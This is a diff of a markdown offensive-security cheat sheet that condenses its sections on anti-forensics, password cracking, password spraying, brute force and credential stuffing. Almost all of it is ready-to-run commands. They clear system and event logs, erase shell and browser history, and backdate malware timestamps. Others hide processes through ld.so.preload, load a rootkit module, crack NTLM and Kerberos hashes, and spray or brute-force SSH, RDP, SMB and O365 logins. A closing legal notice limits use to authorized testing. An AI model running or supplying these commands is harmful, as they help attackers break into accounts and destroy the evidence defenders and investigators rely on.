 echo "" > /var/log/auth.log
 echo "" > /var/log/syslog
-echo "" > /var/log/messages
-# Use Case: Basic log clearing
-# Explanation: Empties log files to remove evidence
+# Use: Basic clearing - empties log files
 
-# Selective Log Entry Removal
 sed -i '/10.10.10.10/d' /var/log/apache2/access.log
-sed -i '/username/d' /var/log/auth.log
-# Use Case: Targeted log entry removal
-# Explanation: Removes specific entries while keeping others
+# Use: Selective removal - deletes specific entries
 
-# Log Rotation Manipulation
 logrotate -f /etc/logrotate.conf
-# Use Case: Forced log rotation
-# Explanation: Triggers log rotation to archive current logs
+# Use: Log rotation - forces log rotation
 
-# Journald Log Cleaning
 journalctl --vacuum-time=1s
-journalctl --vacuum-size=1M
-# Use Case: Systemd journal cleaning
-# Explanation: Reduces journal size or removes old entries
+# Use: Journal cleaning - removes journal entries
 
-journalctl --flush
-# Use Case: Journal flushing
-# Explanation: Forces journal to write to disk
-
-# Comprehensive Log Cleaning Script
-for log in /var/log/*.log; do echo "" > $log; done
-find /var/log -name "*.log" -exec sh -c 'echo "" > {}' \;
-# Use Case: Bulk log cleaning
-# Explanation: Clears all log files in /var/log
-
-Windows Log Manipulation
-powershell
-# Event Log Clearing
+# Windows log manipulation
 wevtutil cl System
 wevtutil cl Security
 wevtutil cl Application
-# Use Case: Windows event log clearing
-# Explanation: Clears major Windows event logs
+# Use: Event log clearing - clears Windows event logs
 
-Get-EventLog -List | ForEach-Object { Clear-EventLog $_.Log }
-# Use Case: PowerShell event log clearing
-# Explanation: Clears all event logs using PowerShell
-
-# Selective Event Removal
-wevtutil epl Security backup.evtx "/q:*[System[(EventID=4624)]]"
-wevtutil cl Security
-wevtutil al backup.evtx
-# Use Case: Selective event backup and restore
-# Explanation: Backups specific events, clears log, restores backup
-
-# Event Log Service Manipulation
 net stop eventlog
 net start eventlog
-# Use Case: Event log service restart
-# Explanation: Restarts event log service
+# Use: Service restart - restarts event log service
 
-# WEF Subscription Removal
-wecutil ss
-wecutil ds SubscriptionName
-# Use Case: Windows Event Forwarding cleanup
-# Explanation: Lists and removes event subscriptions
-
-Web Server Log Cleaning
-bash
-# Apache Log Cleaning
+# Web server logs
 echo "" > /var/log/apache2/access.log
-echo "" > /var/log/apache2/error.log
-# Use Case: Apache log clearing
-# Explanation: Clears Apache access and error logs
-
-# Nginx Log Cleaning
 echo "" > /var/log/nginx/access.log
-echo "" > /var/log/nginx/error.log
-# Use Case: Nginx log clearing
-# Explanation: Clears Nginx access and error logs
+# Use: Web log clearing - clears web server logs
+```
 
-# IIS Log Cleaning
-del C:\inetpub\logs\LogFiles\W3SVC1\*.log
-# Use Case: IIS log deletion
-# Explanation: Deletes IIS log files
-
-13.2 File Timestamp Manipulation
-
-Linux Timestamp Manipulation
-bash
-# Timestamp Modification
+### File Timestamp Manipulation
+```bash
+# Linux timestamps
 touch -r /bin/ls malicious_file
-# Use Case: Reference file timestamp copying
-# Explanation: Sets timestamp to match legitimate file
+# Use: Reference copying - copies timestamp from legit file
 
 touch -t 202001010000 malicious_file
-# Use Case: Specific timestamp setting
-# Explanation: Sets exact timestamp (YYYYMMDDhhmm)
+# Use: Specific timestamp - sets exact timestamp
 
-# Timestamp Backdating
 find /tmp -name "malicious*" -exec touch -t 202001010000 {} \;
-# Use Case: Bulk timestamp modification
-# Explanation: Changes timestamps for multiple files
+# Use: Bulk modification - changes multiple file timestamps
 
-# Extended Attribute Manipulation
-setfattr -n user.comment -v "legitimate file" malicious_file
-# Use Case: Metadata manipulation
-# Explanation: Adds fake metadata to files
-
-# Inode Time Manipulation
-debugfs -w /dev/sda1 -R "set_inode_field /path/to/file i_atime 202001010000"
-# Use Case: Low-level timestamp manipulation
-# Explanation: Direct inode modification (requires unmounted FS)
-
-Windows Timestamp Manipulation
-powershell
-# File Timestamp Modification
+# Windows timestamps
 (Get-Item malicious.exe).CreationTime = '01/01/2020 00:00:00'
-(Get-Item malicious.exe).LastWriteTime = '01/01/2020 00:00:00'
-(Get-Item malicious.exe).LastAccessTime = '01/01/2020 00:00:00'
-# Use Case: PowerShell timestamp modification
-# Explanation: Changes file timestamps using PowerShell
+# Use: PowerShell modification - changes file timestamps
 
-# CMD Timestamp Modification
 copy /b malicious.exe +,,
-# Use Case: CMD timestamp update
-# Explanation: Updates file timestamp to current time
+# Use: CMD modification - updates file timestamp
+```
 
-# Timestomp-like Functionality
-$file = Get-Item "malicious.exe"
-$file.CreationTime = "01/01/2020"
-$file.LastWriteTime = "01/01/2020"
-$file.LastAccessTime = "01/01/2020"
-# Use Case: Comprehensive timestamp manipulation
-# Explanation: Modifies all timestamp attributes
-
-Registry Timestamp Manipulation
-cmd
-# Registry Key Timestamp Modification
-reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Malicious /t REG_SZ /d "C:\malware.exe" /f
-# Use Case: Registry modification with current timestamp
-# Explanation: Adding registry entries updates timestamps
-
-# Offline Registry Editing
-reg load HKLM\Temp C:\Windows\System32\config\SOFTWARE
-reg delete "HKLM\Temp\Microsoft\Windows\CurrentVersion\Run" /v Malicious /f
-reg unload HKLM\Temp
-# Use Case: Offline registry manipulation
-# Explanation: Modifies registry hives while offline
-
-13.3 Artifact Removal
-
-Browser History Cleaning
-bash
-# Chrome History Cleaning
+### Artifact Removal
+```bash
+# Browser history
 rm -rf ~/.config/google-chrome/Default/History
-rm -rf ~/.config/google-chrome/Default/History-journal
-# Use Case: Chrome browser history removal
-# Explanation: Deletes Chrome browsing history
-
-# Firefox History Cleaning
 rm -rf ~/.mozilla/firefox/*.default/places.sqlite
-rm -rf ~/.mozilla/firefox/*.default/places.sqlite-wal
-# Use Case: Firefox browser history removal
-# Explanation: Deletes Firefox browsing history
+# Use: Browser cleaning - removes browsing history
 
-# Comprehensive Browser Cleaning
-find ~ -name "History" -delete
-find ~ -name "places.sqlite" -delete
-find ~ -name "Cookies" -delete
-# Use Case: Multi-browser artifact removal
-# Explanation: Removes artifacts from all browsers
-
-System Artifact Removal
-bash
-# Bash History Cleaning
+# System artifacts
 echo "" > ~/.bash_history
 history -c
-# Use Case: Command history removal
-# Explanation: Clears bash command history
+# Use: Command history - clears shell history
 
-# SSH Key Removal
-rm -rf ~/.ssh/known_hosts
-rm -rf ~/.ssh/authorized_keys
-# Use Case: SSH artifact cleanup
-# Explanation: Removes SSH connection artifacts
-
-# Temporary File Cleaning
 rm -rf /tmp/malicious*
 rm -rf /var/tmp/suspicious*
-# Use Case: Temporary file removal
-# Explanation: Cleans up temporary directories
+# Use: Temp file cleaning - removes temporary files
 
-# Download History
-rm -rf ~/.cache/thumbnails/*
-rm -rf ~/.local/share/Trash/*
-# Use Case: System cache and trash cleaning
-# Explanation: Removes cached thumbnails and trash contents
-
-Windows Artifact Removal
-powershell
-# Prefetch File Cleaning
+# Windows artifacts
 Remove-Item C:\Windows\Prefetch\*.pf -Force
-# Use Case: Prefetch file removal
-# Explanation: Deletes application prefetch files
+# Use: Prefetch cleaning - deletes prefetch files
 
-# Jump List Cleaning
 Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force
-# Use Case: Jump list removal
-# Explanation: Clears Windows jump lists
+# Use: Jump list cleaning - clears recent documents
+```
 
-# Thumbnail Cache Cleaning
-Remove-Item "$env:LOCALAPPDATA\Microsoft\Windows\Explorer\thumbcache_*.db" -Force
-# Use Case: Thumbnail cache removal
-# Explanation: Deletes thumbnail cache databases
-
-# Recent Documents Cleaning
-Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" -Recurse -Force
-# Use Case: Recent documents registry cleanup
-# Explanation: Removes recent documents from registry
-
-13.4 Memory Forensics Evasion
-
-Process Hiding Techniques
-bash
-# LD_PRELOAD Hooking
+### Memory Forensics Evasion
+```bash
+# Process hiding
 echo "/tmp/malicious_lib.so" > /etc/ld.so.preload
-# Use Case: Library preloading for hiding
-# Explanation: Hooks system calls to hide processes
+# Use: Library preloading - hooks system calls
 
-# Mount Namespace Hiding
 unshare -m --propagation private
-# Use Case: Mount namespace isolation
-# Explanation: Creates private mount namespace
+# Use: Namespace isolation - creates private mount namespace
 
-# Process Name Obfuscation
 cp /bin/bash /tmp/.hidden_process
 exec -a "[kworker/0:0]" /tmp/.hidden_process
-# Use Case: Process name spoofing
-# Explanation: Masquerades as legitimate system process
+# Use: Process spoofing - masquerades as system process
 
-Rootkit Techniques
-bash
-# Loadable Kernel Module (LKM) Hiding
+# Rootkit techniques
 insmod rootkit.ko
-# Use Case: Kernel-level hiding
-# Explanation: Loads kernel module for advanced hiding
+# Use: Kernel module - loads hiding kernel module
 
-# System Call Table Hooking
-# Custom kernel module that hooks sys_getdents64
-# Use Case: File and process hiding
-# Explanation: Hooks system calls to hide artifacts
-
-# Network Connection Hiding
-# Hook sys_netstat or similar calls
-# Use Case: Network connection concealment
-# Explanation: Hides network connections from tools
-
-Anti-Forensic Tools
-bash
-# BleachBit System Cleaning
+# Anti-forensic tools
 bleachbit --preset
-bleachbit --clean bash.history system.cache system.tmp
-# Use Case: Comprehensive system cleaning
-# Explanation: Uses BleachBit for artifact removal
+# Use: System cleaning - comprehensive artifact removal
 
-# CCleaner (Windows)
-CCleaner.exe /AUTO
-# Use Case: Windows system cleaning
-# Explanation: Uses CCleaner for automated cleaning
-
-# SDelete Secure Deletion
 sdelete -p 3 -s C:\sensitive-file.txt
-# Use Case: Secure file deletion
-# Explanation: Overwrites files before deletion
+# Use: Secure deletion - overwrites files before deletion
+```
 
-14.PASSWORD ATTACKS
+---
 
-14.1 Hash Cracking
+## 20. Password Attacks
 
-Hashcat - Advanced Password Cracking
-bash
-# NTLM Hash Cracking
-hashcat -m 1000 hashes.txt -a 0 rockyou.txt -r rules/best64.rule -O -w 4 --force
-# Use Case: Windows password cracking
-# Explanation: Cracks NTLM hashes with wordlist and rules
+### Hash Cracking
+```bash
+# Hashcat
+hashcat -m 1000 hashes.txt -a 0 rockyou.txt -r rules/best64.rule
+# Use: NTLM cracking - cracks Windows hashes with rules
 
-hashcat -m 1000 hashes.txt -a 3 ?d?d?d?d?d?d?d?d --increment
-# Use Case: NTLM brute force
-# Explanation: Brute forces NTLM hashes with digits
+hashcat -m 1000 hashes.txt -a 3 ?d?d?d?d?d?d?d?d
+# Use: Brute force - digit-based brute force
 
-hashcat -m 1000 hashes.txt -a 6 password?d?d?d -1 ?l?u?d
-# Use Case: Hybrid attack
-# Explanation: Combines wordlist with mask patterns
-
-# WPA/WPA2 Handshake Cracking
 hashcat -m 22000 capture.hc22000 -a 3 ?d?d?d?d?d?d?d?d
-# Use Case: WPA password cracking
-# Explanation: Cracks WPA handshakes with brute force
+# Use: WPA cracking - brute forces WPA passwords
 
-hashcat -m 22000 capture.hc22000 wordlist.txt -r rules/InsidePro-PasswordsPro.rule
-# Use Case: WPA with wordlist and rules
-# Explanation: Uses wordlist with rules for WPA cracking
-
-# Kerberos Ticket Cracking
 hashcat -m 13100 kerberoast_hashes.txt rockyou.txt
-# Use Case: Kerberoasting hash cracking
-# Explanation: Cracks Kerberos service account hashes
+# Use: Kerberoasting - cracks service account hashes
 
-hashcat -m 18200 asrep_hashes.txt rockyou.txt
-# Use Case: AS-REP roasting hash cracking
-# Explanation: Cracks AS-REP response hashes
-
-# Advanced Hashcat Options
-hashcat -m 0 hashes.txt -r rules/InsidePro-PasswordsPro.rule wordlist.txt --potfile-disable --outfile-format 2
-# Use Case: Custom output formatting
-# Explanation: Disables potfile and customizes output
-
-hashcat -m 1000 hashes.txt --show
-# Use Case: Results display
-# Explanation: Shows cracked hashes from potfile
-
-John the Ripper - Password Cracking
-bash
-# Multi-Format Hash Cracking
+# John the Ripper
 john --format=raw-md5 hashes.txt --wordlist=wordlist.txt --rules
-# Use Case: MD5 hash cracking
-# Explanation: Cracks MD5 hashes with rules
+# Use: Multi-format - various hash type cracking
 
 john --format=netntlmv2 hashes.txt --fork=4
-# Use Case: NTLMv2 hash cracking
-# Explanation: Cracks NTLMv2 hashes with multiple forks
+# Use: Parallel cracking - multi-core processing
 
-john --format=krb5tgs hashes.txt --wordlist=wordlist.txt
-# Use Case: Kerberos ticket cracking
-# Explanation: Cracks Kerberos TGS tickets
-
-# Incremental and Mask Attacks
 john --incremental=Digits hashes.txt
-# Use Case: Digit-based brute force
-# Explanation: Uses incremental mode for digits
+# Use: Incremental mode - digit-based brute force
 
-john --mask=?l?l?l?l?l?l?l?l hashes.txt
-# Use Case: Custom mask attacks
-# Explanation: Uses mask for specific pattern cracking
-
-# Session Management
-john --restore=session_name
-# Use Case: Session restoration
-# Explanation: Restores interrupted cracking sessions
-
-john --status=session_name
-# Use Case: Session status checking
-# Explanation: Shows progress of cracking session
-
-Rainbow Table Attacks
-bash
-# Rainbow Table Generation
+# Rainbow tables
 rtgen md5 loweralpha 1 7 0 3800 33554432 0
-# Use Case: Rainbow table creation
-# Explanation: Generates rainbow tables for specific parameters
+# Use: Table generation - creates rainbow tables
 
-# Rainbow Table Usage
 rcrack . -l hashes.txt
-# Use Case: Rainbow table cracking
-# Explanation: Uses rainbow tables for fast hash cracking
+# Use: Table cracking - uses rainbow tables for fast cracking
+```
 
-rtsort .
-# Use Case: Rainbow table sorting
-# Explanation: Sorts rainbow tables for efficient usage
-
-14.2 Password Spraying
-
-Domain Password Spraying
-bash
-# Kerbrute for Kerberos Spraying
+### Password Spraying
+```bash
+# Kerbrute
 kerbrute passwordspray -d domain.local users.txt Password123
-# Use Case: Kerberos password spraying
-# Explanation: Sprays passwords against Kerberos service
+# Use: Kerberos spraying - sprays passwords against Kerberos
 
 kerbrute bruteuser -d domain.local passwords.txt username
-# Use Case: User-specific brute forcing
-# Explanation: Brute forces specific user account
+# Use: User brute force - targets specific user
 
-# CrackMapExec SMB Spraying
+# CrackMapExec spraying
 crackmapexec smb 10.10.10.0/24 -u users.txt -p 'Spring2023!' --continue-on-success
-# Use Case: SMB password spraying
-# Explanation: Sprays passwords against SMB service
+# Use: SMB spraying - sprays against SMB services
 
-# SprayingToolkit
-python3 sprayer.py -smb -targets targets.txt -users users.txt -passwords passwords.txt -threads 5
-# Use Case: Multi-protocol spraying
-# Explanation: Sprays passwords across multiple protocols
+# Custom spraying
+python3 sprayer.py -smb -targets targets.txt -users users.txt -passwords passwords.txt
+# Use: Multi-protocol - various protocol spraying
 
-Web Application Password Spraying
-bash
-# Hydra for Web Spraying
+# Web application spraying
 hydra -L users.txt -P passwords.txt 10.10.10.10 http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect"
-# Use Case: Web form password spraying
-# Explanation: Sprays passwords against web login forms
+# Use: Web form spraying - HTTP form credential testing
 
-hydra -l admin -P passwords.txt 10.10.10.10 http-get /admin
-# Use Case: HTTP basic auth spraying
-# Explanation: Sprays against HTTP basic authentication
-
-# Custom Python Spraying Script
-python3 sprayer.py --url https://target.com/login --users users.txt --passwords passwords.txt --delay 10
-# Use Case: Custom spraying with rate limiting
-# Explanation: Implements custom spraying with delays
-
-O365 & Cloud Service Spraying
-bash
-# MSOLSpray for O365
+# O365 spraying
 python3 MSOLSpray.py --url https://login.microsoft.com --users users.txt --passwords passwords.txt
-# Use Case: Office 365 password spraying
-# Explanation: Sprays passwords against O365 services
+# Use: Office 365 - sprays against O365 services
 
-# o365spray for Office 365
 python3 o365spray.py --spray -u users.txt -p 'Company123!' --count 1 --lockout 1
-# Use Case: O365 spraying with lockout awareness
-# Explanation: Sprays with lockout threshold monitoring
+# Use: Lockout aware - spraying with lockout monitoring
+```
 
-# Okta API Spraying
-python3 okta_spray.py -t target.okta.com -u users.txt -p passwords.txt
-# Use Case: Okta service spraying
-# Explanation: Sprays passwords against Okta authentication
-
-14.3 Brute Force Attacks
-
-Online Brute Force Attacks
-bash
-# SSH Brute Force
-hydra -L users.txt -P passwords.txt ssh://10.10.10.10 -t 4 -V -f
-# Use Case: SSH service brute forcing
-# Explanation: Brute forces SSH credentials
+### Brute Force Attacks
+```bash
+# Online brute force
+hydra -L users.txt -P passwords.txt ssh://10.10.10.10
+# Use: SSH brute force - credential testing for SSH
 
 ncrack -U users.txt -P passwords.txt ssh://10.10.10.10:22
-# Use Case: Alternative SSH brute forcing
-# Explanation: Uses ncrack for SSH brute force
+# Use: Alternative SSH - uses ncrack for SSH
 
-# RDP Brute Force
 hydra -l administrator -P passwords.txt rdp://10.10.10.10
-# Use Case: RDP service brute forcing
-# Explanation: Brute forces Remote Desktop credentials
+# Use: RDP brute force - Remote Desktop credential testing
 
 crowbar -b rdp -s 10.10.10.10/32 -u admin -C passwords.txt
-# Use Case: RDP brute force with crowbar
-# Explanation: Uses crowbar tool for RDP attacks
+# Use: RDP with crowbar - alternative RDP tool
 
-# FTP Brute Force
-hydra -L users.txt -P passwords.txt ftp://10.10.10.10
-# Use Case: FTP service brute forcing
-# Explanation: Brute forces FTP credentials
-
-nmap --script ftp-brute --script-args userdb=users.txt,passdb=passwords.txt 10.10.10.10
-# Use Case: Nmap FTP brute force script
-# Explanation: Uses NSE script for FTP brute force
-
-Offline Brute Force Attacks
-bash
-# ZIP File Password Cracking
+# Offline attacks
 fcrackzip -u -D -p passwords.txt archive.zip
-# Use Case: ZIP archive password cracking
-# Explanation: Brute forces ZIP file passwords
+# Use: ZIP cracking - brute forces ZIP passwords
 
-john --format=zip hashes.txt
-# Use Case: John for ZIP hashes
-# Explanation: Uses John for ZIP hash cracking
-
-# PDF Password Cracking
 pdf2john.pl document.pdf > pdf_hash.txt
 john pdf_hash.txt
-# Use Case: PDF password cracking
-# Explanation: Extracts and cracks PDF passwords
+# Use: PDF cracking - extracts and cracks PDF passwords
 
-# Office Document Cracking
 office2john.py document.docx > office_hash.txt
 john office_hash.txt
-# Use Case: Office document password cracking
-# Explanation: Cracks Microsoft Office passwords
+# Use: Office cracking - cracks Microsoft Office documents
+```
 
-14.4 Credential Stuffing
-
-Custom Credential Stuffing Tools
-bash
-# BlackWidow Credential Stuffing
+### Credential Stuffing
+```bash
+# Custom tools
 python3 blackwidow.py -t target.com -c cookies.txt -p proxies.txt
-# Use Case: Automated credential stuffing
-# Explanation: Uses cookies and proxies for stuffing attacks
+# Use: Automated stuffing - uses cookies and proxies
 
-# SNIPR Credential Stuffing
 python3 snipr.py -u users.txt -p passwords.txt -t target.com -f login_form
-# Use Case: Form-based credential stuffing
-# Explanation: Targets specific login forms
+# Use: Form-based - targets specific login forms
 
-# AccountChecker Tool
 AccountChecker.exe -c config.json -u users.txt -p passwords.txt -t 10
-# Use Case: Multi-threaded credential checking
-# Explanation: Checks credentials across multiple threads
+# Use: Multi-threaded - high-performance credential checking
 
-API Credential Testing
-bash
-# REST API Credential Testing
+# API credential testing
 python3 api_tester.py --endpoint https://api.target.com/auth --users users.txt --passwords passwords.txt --method POST
-# Use Case: API credential stuffing
-# Explanation: Tests credentials against API endpoints
+# Use: API stuffing - tests credentials against APIs
 
-# JWT Token Testing
 python3 jwt_tester.py --tokens tokens.txt --endpoint https://api.target.com/protected
-# Use Case: JWT token validation
-# Explanation: Tests JWT tokens against protected endpoints
+# Use: JWT testing - validates JWT tokens
+```
 
+---
+
+## Legal Notice
+
+This document is for educational and authorized security testing purposes only. Always ensure you have explicit permission before using these techniques against any systems.
+
+- Only use on systems you own or have explicit written permission to test
+- Maintain detailed logs and documentation for all testing activities
+- Follow responsible disclosure practices for any vulnerabilities found
+- Understand and comply with local laws and regulations
+
+**Disclaimer**: The maintainers are not responsible for any misuse of this information. Always conduct security testing ethically and legally.
+
+---
+
+*This reference serves as the definitive guide for security professionals, red team operators, penetration testers, and anyone involved in offensive security operations.*
